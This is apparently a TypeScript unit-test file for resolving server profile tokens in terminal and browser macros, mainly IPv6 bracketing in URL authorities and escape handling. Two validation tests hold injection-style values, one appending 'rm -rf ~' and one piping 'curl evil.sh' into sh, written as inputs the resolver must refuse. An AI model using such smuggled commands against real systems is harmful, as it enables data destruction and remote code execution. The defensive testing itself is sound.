    const text = resolved("https://${profile.ipmiHost}/", server({ ipmiHost: "fe80::1" }), URL_FORM);
    expect(text).toBe("https://[fe80::1]/");
    // The property that actually matters — the pre-fix `https://fe80::1/` throws.
    expect(new URL(text).protocol).toBe("https:");
  });

  it("does the same for ${profile.host}, and for every IPv6 shape the field accepts", () => {
    for (const [stored, expected] of [
      ["::1", "[::1]"],
      ["fe80::1", "[fe80::1]"],
      ["2001:db8:0:0:0:0:0:1", "[2001:db8:0:0:0:0:0:1]"],
      ["2001:0db8:85a3:0000:0000:8a2e:0370:7334", "[2001:0db8:85a3:0000:0000:8a2e:0370:7334]"],
      ["::ffff:10.0.0.1", "[::ffff:10.0.0.1]"]
    ] as const) {
      expect(resolved("https://${profile.host}/", server({ host: stored }), URL_FORM)).toBe(`https://${expected}/`);
    }
  });

  it("never double-brackets a value that is already bracketed, with or without a port", () => {
    expect(resolved("https://${profile.ipmiHost}/", server({ ipmiHost: "[fe80::1]" }), URL_FORM)).toBe(
      "https://[fe80::1]/"
    );
    // `[fe80::1]:623` is already a valid URL authority — bracketing it again
    // would produce `[[fe80::1]:623]`, which is not.
    expect(resolved("https://${profile.ipmiHost}/", server({ ipmiHost: "[fe80::1]:623" }), URL_FORM)).toBe(
      "https://[fe80::1]:623/"
    );
    expect(new URL(resolved("https://${profile.ipmiHost}/", server({ ipmiHost: "[fe80::1]:623" }), URL_FORM)).port).toBe(
      "623"
    );
  });

  it("does NOT bracket a host:port that merely contains a colon", () => {
    // The trap a "contains a colon" test would fall into: this value works in a
    // URL today, and `[bmc.example.com:8443]` would break it.
    expect(resolved("https://${profile.ipmiHost}/", server({ ipmiHost: "bmc.example.com:8443" }), URL_FORM)).toBe(
      "https://bmc.example.com:8443/"
    );
    expect(resolved("https://${profile.host}/", server({ host: "10.0.0.9:8443" }), URL_FORM)).toBe(
      "https://10.0.0.9:8443/"
    );
  });

  it("leaves every non-IPv6 address untouched", () => {
    for (const stored of ["10.0.0.9", "bmc.example.com", "bmc-1_dc4", "192.168.1.1"]) {
      expect(resolved("https://${profile.host}/", server({ host: stored }), URL_FORM)).toBe(`https://${stored}/`);
    }
  });

  it("brackets NOTHING but the two address tokens", () => {
    // `name`, `port` and `username` have no URL-authority form to fix, and a
    // form-blind "bracket anything that looks like IPv6" would reach them.
    expect(resolved("https://x/?u=${profile.username}&n=${profile.name}", server({ username: "a.b", name: "Core Switch" }), URL_FORM)).toBe(
      "https://x/?u=a.b&n=Core Switch"
    );
    expect(resolved("https://x:${profile.port}/", server({ port: 8443 }), URL_FORM)).toBe("https://x:8443/");
  });

  it("COMMAND FORM IS UNCHANGED — `-H fe80::1` is what ipmitool wants", () => {
    // The other half of the fix, and the one a context-blind always-bracket
    // implementation breaks: the shipped SOL template is a localTerminal macro.
    expect(resolved(" ipmitool -H ${profile.ipmiHost} sol activate\n", server({ ipmiHost: "fe80::1" }))).toBe(
      " ipmitool -H fe80::1 sol activate\n"
    );
    expect(resolved("-H ${profile.host}", server({ host: "fe80::1" }), { form: "command" })).toBe("-H fe80::1");
    // Explicit default: omitting the context is command form.
    expect(resolved("-H ${profile.host}", server({ host: "::1" }))).toBe("-H ::1");
  });

  it("does not change what is ACCEPTED — the charset is the same in both forms", () => {
    // Bracketing is a rendering decision, never a permission one: a value that
    // carries shell syntax is refused for a URL too (the same text is one
    // `runIn` change away from a command line).
    for (const bad of ["1.2.3.4; rm -rf ~", "[abc]", "a[b]c", "https://10.0.0.1/"]) {
      expect(resolveProfileTokens("https://${profile.ipmiHost}/", server({ ipmiHost: bad }), URL_FORM).ok, bad).toBe(
        false
      );
    }
    // …and a missing field still refuses rather than substituting empty brackets.
    expect(resolveProfileTokens("https://${profile.ipmiHost}/", server(), URL_FORM).ok).toBe(false);
  });

  it("brackets ONLY inside the URL authority — a token in the QUERY is left alone", () => {
    // REVIEW FINDING (P2). Bracketing is a rule of the AUTHORITY component, not
    // of URLs: RFC 3986 needs `[...]` there so the address's colons are not read
    // as the port delimiter, and that ambiguity exists nowhere else. The first
    // version of this feature bracketed every bare IPv6 in URL form regardless
    // of position, so a gateway macro received a corrupted parameter value.
    const text = resolved(
      "https://gateway/connect?target=${profile.host}",
      server({ host: "fe80::1" }),
      URL_FORM
    );
    expect(text).toBe("https://gateway/connect?target=fe80::1");
    // The exact string the always-bracket implementation produced.
    expect(text).not.toContain("target=[fe80::1]");
    expect(new URL(text).searchParams.get("target")).toBe("fe80::1");
  });

  it("does not bracket a token in the PATH either", () => {
    expect(resolved("https://gateway/host/${profile.host}/status", server({ host: "fe80::1" }), URL_FORM)).toBe(
      "https://gateway/host/fe80::1/status"
    );
    // …nor one in the fragment.
    expect(resolved("https://gateway/#${profile.host}", server({ host: "fe80::1" }), URL_FORM)).toBe(
      "https://gateway/#fe80::1"
    );
  });

  it("decides each token in one macro independently — authority bracketed, query not", () => {
    // The case a per-RUN flag cannot get right, and the reason the decision is
    // made per match offset against the template's authority spans.
    const text = resolved(
      "https://${profile.ipmiHost}/redirect?peer=${profile.host}",
      server({ ipmiHost: "fe80::1", host: "fe80::2" }),
      URL_FORM
    );
    expect(text).toBe("https://[fe80::1]/redirect?peer=fe80::2");
    // Exactly one bracketed occurrence, so neither an always-bracket nor a
    // never-bracket implementation passes.
    expect(text.match(/\[/g)?.length).toBe(1);
    expect(new URL(text).hostname).toBe("[fe80::1]");
    expect(new URL(text).searchParams.get("peer")).toBe("fe80::2");
  });

  it("brackets an authority token that ends the URL, with no trailing delimiter", () => {
    // The authority runs to end-of-string when no `/`, `?` or `#` follows — an
    // off-by-one here would silently stop bracketing the commonest shape.
    expect(resolved("https://${profile.host}", server({ host: "fe80::1" }), URL_FORM)).toBe("https://[fe80::1]");
    expect(resolved("https://${profile.host}?x=1", server({ host: "fe80::1" }), URL_FORM)).toBe(
      "https://[fe80::1]?x=1"
    );
    expect(resolved("https://${profile.host}#f", server({ host: "fe80::1" }), URL_FORM)).toBe("https://[fe80::1]#f");
  });

  it("brackets NOTHING when the template has no parseable scheme", () => {
    // There is no authority to be in, so there is no bracketing to do. The text
    // is not a URL either way, and `resolveMacroBrowserUrl()` refuses it with an
    // actionable message — guessing here would only change which wrong thing
    // that message describes.
    expect(resolved("gateway/${profile.host}", server({ host: "fe80::1" }), URL_FORM)).toBe("gateway/fe80::1");
    expect(resolved("${profile.host}", server({ host: "fe80::1" }), URL_FORM)).toBe("fe80::1");
  });

  it("sees a scheme supplied by a MACRO VARIABLE — `${scheme}://` opens an authority too", () => {
    // REVIEW FINDING (P2). The span scan reads the PRE-substitution template, and
    // it used to look only for a LITERAL `scheme://`. A macro written as
    // `${scheme}://${profile.ipmiHost}/` (with `scheme` declared and answered
    // `https`) has no literal scheme, so no span opened, the bare IPv6 was left
    // unbracketed, and the VARIABLE pass then produced `https://fe80::1/` — which
    // `new URL()` rejects, so the run was refused with "not an http:// or
    // https:// URL — Edit Macro", blaming a macro that is correct.
    const text = resolved("${scheme}://${profile.ipmiHost}/", server({ ipmiHost: "fe80::1" }), URL_FORM);
    expect(text).toBe("${scheme}://[fe80::1]/");
    // The string the pre-fix implementation produced, and the reason it broke.
    expect(text).not.toBe("${scheme}://fe80::1/");

    // …and the end-to-end property: the variable pass runs next, and what it
    // yields must parse.
    const url = substituteMacroVariables(text, { scheme: "https" }, ["scheme"]);
    expect(url).toBe("https://[fe80::1]/");
    expect(new URL(url).hostname).toBe("[fe80::1]");
    // What the pre-fix output became — the throw behind the misdirected error.
    expect(() => new URL("https://fe80::1/")).toThrow();
  });

  it("sees the BARE placeholder form as well — `$s_://` is a scheme the literal scan cannot see", () => {
    // The variable grammar has two forms and both reach `://`. `$s://` happens to
    // be caught by the literal scheme scan by coincidence (`s://` is itself a
    // legal scheme production), so the shape that actually pins the fix is a name
    // ending in `_`, which RFC 3986's scheme charset excludes: nothing in
    // `$s_://` matches `[A-Za-z][A-Za-z0-9+.\-]*://`.
    expect(resolved("$s_://${profile.host}/", server({ host: "fe80::1" }), URL_FORM)).toBe("$s_://[fe80::1]/");
    // The coincidental form must keep working too — the merge of the two scanners
    // must not double-count it into a wrong span.
    expect(resolved("$s://${profile.host}/", server({ host: "fe80::1" }), URL_FORM)).toBe("$s://[fe80::1]/");
    expect(substituteMacroVariables(resolved("$s://${profile.host}/", server({ host: "fe80::1" }), URL_FORM), { s: "https" }, ["s"])).toBe(
      "https://[fe80::1]/"
    );
  });

  it("does NOT treat an ESCAPED placeholder as a scheme — it renders as literal text", () => {
    // `$${scheme}` is documented to send the literal `${scheme}`, so the rendered
    // text is `${scheme}://…` — not a URL at all, and certainly not one whose host
    // wants brackets. A fix that matched the placeholder grammar without reading
    // the escape group would bracket here.
    // This pass leaves the escape alone (un-escaping is the variable pass's job),
    // so what it must get right is only the bracketing decision.
    const text = resolved("$${scheme}://${profile.host}/", server({ host: "fe80::1" }), URL_FORM);
    expect(text).toBe("$${scheme}://fe80::1/");
    expect(text).not.toContain("[fe80::1]");
    // And this is what the variable pass then renders — a literal `${scheme}`,
    // which is no scheme, so there was never a host to bracket.
    expect(substituteMacroVariables(text, { scheme: "https" }, ["scheme"])).toBe("${scheme}://fe80::1/");
  });

  it("opens nothing for a placeholder that is not followed by `://`", () => {
    // A variable is only a scheme when it sits exactly where a scheme sits. A
    // rule of "any placeholder opens an authority" would bracket both of these.
    expect(resolved("${a} ${profile.host}", server({ host: "fe80::1" }), URL_FORM)).toBe("${a} fe80::1");
    expect(resolved("$a ${profile.host}", server({ host: "fe80::1" }), URL_FORM)).toBe("$a fe80::1");
    expect(resolved("${a}:/${profile.host}", server({ host: "fe80::1" }), URL_FORM)).toBe("${a}:/fe80::1");
  });

  it("still stops the authority at the first delimiter when the scheme came from a variable", () => {
    // The span END rule is unchanged, so a token in the QUERY of a
    // variable-schemed URL is a value, exactly as it is under a literal scheme.
    const text = resolved(
      "${scheme}://gateway/connect?target=${profile.host}",
      server({ host: "fe80::1" }),
      URL_FORM
    );
    expect(text).toBe("${scheme}://gateway/connect?target=fe80::1");
    expect(text).not.toContain("[fe80::1]");

    // Both at once: authority bracketed, query not, under one variable scheme.
    const both = resolved(
      "${scheme}://${profile.ipmiHost}/redirect?peer=${profile.host}",
      server({ ipmiHost: "fe80::1", host: "fe80::2" }),
      URL_FORM
    );
    expect(both).toBe("${scheme}://[fe80::1]/redirect?peer=fe80::2");
    expect(both.match(/\[/g)?.length).toBe(1);
  });

  it("COMMAND FORM IS UNTOUCHED BY A VARIABLE-SUPPLIED SCHEME — no brackets anywhere", () => {
    // Span detection only ever runs in URL form; a command-form macro containing
    // `${scheme}://` still gets the raw value ipmitool wants.
    expect(resolved("curl ${scheme}://${profile.host}/", server({ host: "fe80::1" }))).toBe(
      "curl ${scheme}://fe80::1/"
    );
    expect(resolved(" ipmitool -H ${profile.ipmiHost} sol activate\n", server({ ipmiHost: "fe80::1" }))).toBe(
      " ipmitool -H fe80::1 sol activate\n"
    );
  });

  it("COMMAND FORM IS UNTOUCHED BY THE AUTHORITY RULE — no brackets anywhere", () => {
    // A command-form macro that happens to contain a URL still gets the raw
    // value: `curl https://fe80::1/` is the author's problem, not a place to
    // start rewriting values a shell command line never asked us to change.
    expect(resolved("curl https://${profile.host}/", server({ host: "fe80::1" }))).toBe("curl https://fe80::1/");
  });

  it("leaves an ESCAPED token literal in URL form too", () => {
    expect(resolved("https://$${profile.ipmiHost}/", server({ ipmiHost: "fe80::1" }), URL_FORM)).toBe(
      "https://${profile.ipmiHost}/"
    );
  });
});

describe("profile tokens vs. declared macro variables", () => {
  it("a declared `host` is still prompted while ${profile.host} resolves from the profile", () => {
    // The precedence guard: the shipped grammar cannot produce a dotted name, so
    // the two placeholders are different tokens and neither shadows the other.
    // An implementation that auto-filled bare `$host` from the profile would
    // stop prompting — and silently change what every existing macro sends.
    const text = "connect $host via ${profile.host}";
    const afterTokens = resolved(text, server());
    expect(afterTokens).toBe("connect $host via 10.1.2.3");

    const scan = scanPlaceholders(afterTokens, ["host"]);
    expect(scan.used).toEqual(["host"]);

    expect(substituteMacroVariables(afterTokens, { host: "typed-by-user" }, ["host"])).toBe(
      "connect typed-by-user via 10.1.2.3"
    );
  });

  it("leaves the existing bare-name grammar alone — $profile.host is not a profile token", () => {
    expect(resolved("$profile.host", server())).toBe("$profile.host");
  });
});

describe("unescapeProfileTokens — the server-independent half of the escape rule", () => {
  it("rewrites $${profile.host} to the literal token", () => {
    // REVIEW FINDING (P2) — the behavior `$${profile.…}` is documented to have,
    // on every send path rather than only inside `resolveProfileTokens()`.
    expect(unescapeProfileTokens("echo $${profile.host}")).toBe("echo ${profile.host}");
  });

  it("leaves an UNESCAPED token completely alone — it has no server to resolve against", () => {
    // The property that makes this safe to run on paths that know no server:
    // it never substitutes, so a real token still reaches
    // `resolveProfileTokens()` (or is refused/redirected) unchanged.
    expect(unescapeProfileTokens("ping ${profile.host}")).toBe("ping ${profile.host}");
    expect(unescapeProfileTokens("$${profile.host} = ${profile.host}")).toBe("${profile.host} = ${profile.host}");
  });

  it("leaves an escaped UNKNOWN token verbatim, exactly as resolveProfileTokens does", () => {
    // Shared walker, shared rule: an unknown token is verbatim escaped or not,
    // so the two functions cannot disagree about `$${profile.keyPath}`.
    expect(unescapeProfileTokens("echo $${profile.keyPath}")).toBe("echo $${profile.keyPath}");
    expect(resolved("echo $${profile.keyPath}", server())).toBe("echo $${profile.keyPath}");
  });

  it("agrees with resolveProfileTokens on every escaped form, character for character", () => {
    // The single-source-of-truth claim, asserted rather than asserted-in-a-comment:
    // for text whose ONLY tokens are escaped, the server path and the
    // server-independent path must produce the identical string. `$$$` included —
    // an odd run of dollars leaves one behind, and both must leave the same one.
    for (const text of [
      "echo $${profile.host}",
      "echo $${profile.ipmiHost}\n",
      "$${profile.name} $${profile.port} $${profile.username}",
      "$$${profile.host}",
      "echo $${profile.keyPath}",
      "no tokens here\n"
    ]) {
      expect(unescapeProfileTokens(text), text).toBe(resolved(text, server()));
    }
  });

  it("leaves text with no profile tokens byte-identical, macro variables included", () => {
    // The variable grammar has no dots, so nothing here can be mistaken for a
    // profile token — `$host` / `${host}` / `$$host` must survive untouched for
    // the variable engine that runs after this pass.
    for (const text of ["show version\n", "$host ${host} $$host", "$profile.host", "100% $ok"]) {
      expect(unescapeProfileTokens(text), text).toBe(text);
    }
  });
});

describe("profileTokensUsed / hasProfileTokens", () => {
  it("lists the whitelisted tokens a macro actually uses, unescaped, once each", () => {
    expect(profileTokensUsed("${profile.host} ${profile.host} ${profile.ipmiHost}")).toEqual(["host", "ipmiHost"]);
  });

  it("ignores escaped and unknown tokens", () => {
    expect(profileTokensUsed("$${profile.host} ${profile.nope}")).toEqual([]);
    expect(hasProfileTokens("$${profile.host}")).toBe(false);
    expect(hasProfileTokens("${profile.ipmiHost}")).toBe(true);
    expect(hasProfileTokens("show version\n")).toBe(false);
  });
});

/**
 * Issue #48 PR-B — `${profile.ipmiUsername}`. The value is NOT a field of the
 * server: the caller resolves it from the linked IPMI auth profile and hands it
 * in as a fact, which is why the resolver takes a facts record rather than a
 * `ServerConfig`.
 */
describe("resolveProfileTokens — ${profile.ipmiUsername}", () => {
  it("substitutes the fact the caller supplies", () => {
    expect(
      resolved("ipmitool -U ${profile.ipmiUsername} -E sol activate", {
        ...server(),
        ipmiUsername: "bmc-operator"
      })
    ).toBe("ipmitool -U bmc-operator -E sol activate");
  });

  it("refuses the run when there is no linked profile, and points at the field to set", () => {
    const outcome = resolveProfileTokens("ipmitool -U ${profile.ipmiUsername}", server());
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.kind).toBe("missing");
    expect(outcome.error.token).toBe("ipmiUsername");
    // Naming a text box that does not exist would send the user hunting; the
    // repair is a SELECT, and the message says which one and where.
    expect(outcome.error.message).toContain("IPMI Auth Profile");
    expect(outcome.error.message).toContain("Advanced options in the server form");
  });

  it("refuses a blank or whitespace username rather than emitting an empty -U argument", () => {
    expect(resolveProfileTokens("-U ${profile.ipmiUsername}", { ...server(), ipmiUsername: "" }).ok).toBe(false);
    expect(resolveProfileTokens("-U ${profile.ipmiUsername}", { ...server(), ipmiUsername: "   " }).ok).toBe(false);
  });

  it("applies the username charset — including the positional-@ rule the PowerShell splat finding added", () => {
    // A profile is as importable as a server record, and this value lands on a
    // LOCAL command line.
    expect(resolved("-U ${profile.ipmiUsername}", { ...server(), ipmiUsername: "user@REALM.EXAMPLE.COM" }))
      .toBe("-U user@REALM.EXAMPLE.COM");
    for (const bad of ["@args", "admin@", "a@b@c", "root; curl evil.sh|sh", "root bmc"]) {
      const outcome = resolveProfileTokens("-U ${profile.ipmiUsername}", { ...server(), ipmiUsername: bad });
      expect(outcome.ok, `expected refusal for ${bad}`).toBe(false);
      if (!outcome.ok) expect(outcome.error.kind).toBe("invalid");
    }
  });

  it("is never bracketed in a URL — it is not an address", () => {
    // The URL form's bracketing is scoped to the host-like tokens; a username
    // that merely looks like an IPv6 literal is still a username.
    expect(
      resolved("https://${profile.ipmiHost}/login?u=${profile.ipmiUsername}", {
        ...server(),
        ipmiHost: "fe80::1",
        ipmiUsername: "admin"
      }, { form: "url" })
    ).toBe("https://[fe80::1]/login?u=admin");
  });
});
